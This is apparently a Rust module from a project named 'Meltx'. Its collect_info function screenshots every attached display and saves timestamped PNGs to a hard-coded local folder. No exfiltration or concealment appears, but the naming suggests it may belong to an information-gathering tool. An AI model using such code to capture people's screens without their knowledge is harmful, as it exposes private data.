use chrono::Utc;
use image::{DynamicImage::ImageRgba8, ImageOutputFormat::Png};
use screenshots::Screen;
use std::{
    fs::{create_dir_all, File},
    path::Path
};

const SCREENSHOT_DIR: &str = "C:\\Users\\shail\\Desktop\\Meltx\\screen_captures";

// SS from all available screens.
pub fn collect_info() -> Vec<String> {
    let mut saved_paths = Vec::new();

    let screenshot_path = Path::new(SCREENSHOT_DIR);
    if !screenshot_path.exists() {
        create_dir_all(screenshot_path).expect("Failed to create screenshot directory");
    }

    let screens = Screen::all().expect("Failed to get screen list");
    let now_utc = Utc::now();
    let timestamp = now_utc.format("%Y-%m-%d_%H-%M-%S").to_string();

    for (i, screen) in screens.iter().enumerate() {
        match screen.capture() {
            Ok(image) => {
                let img = ImageRgba8(image.into());

                // Filename: screenshot-YYYY-MM-DD_HH-MM-SS_1.png
                let filename = format!("username-{}_{}.png", timestamp, i + 1);
                let filepath = screenshot_path.join(&filename);

                match File::create(&filepath) {
                    Ok(mut file) => {
                        if img
                            .write_to(&mut file, Png)
                            .is_ok()
                        {
                            println!("🖼️ Saved: {}", filepath.to_string_lossy());
                            saved_paths.push(filepath.to_string_lossy().to_string());
                        } else {
                            eprintln!("❌ Failed to write image to disk: {}", filename);
                        }
                    }
                    Err(e) => eprintln!("❌ Could not create file {}: {}", filename, e),
                }
            }
            Err(e) => eprintln!("❌ Failed to capture screen {}: {}", i, e),
        }
    }

    saved_paths
}
